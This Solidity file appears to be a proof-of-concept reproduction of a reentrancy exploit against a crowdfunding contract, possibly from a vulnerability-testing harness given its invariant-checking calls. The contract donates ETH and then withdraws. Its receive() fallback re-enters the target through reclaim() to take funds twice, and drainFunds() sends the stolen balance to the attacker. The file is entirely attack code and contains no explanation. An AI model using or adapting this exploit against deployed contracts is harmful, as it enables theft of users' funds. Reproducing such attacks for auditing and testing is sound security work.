interface ICrowdfund {
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
    function invstore() external;
    function invariant(uint choice) external;
}

contract Reproduction {
    ICrowdfund public target;
    address public attacker;
    bool public reentered;
    uint public exploitValue;

    constructor(address _target) {
        target = ICrowdfund(_target);
        attacker = msg.sender;
    }

    function setup() external payable {
        require(msg.value > 0, "Send ETH to start exploit");
        exploitValue = msg.value;
        target.donate{value: msg.value}();
    }

    function triggerExploit() external {
        target.invstore(); 
        target.withdraw();
    }

    receive() external payable {
        if (!reentered && address(target).balance > 0) {
            reentered = true;
            target.reclaim(); 
        }
    }

    function finalizeExploit() external {
        target.invariant(0); 
    }

    function drainFunds() external {
        payable(attacker).transfer(address(this).balance);
    }
}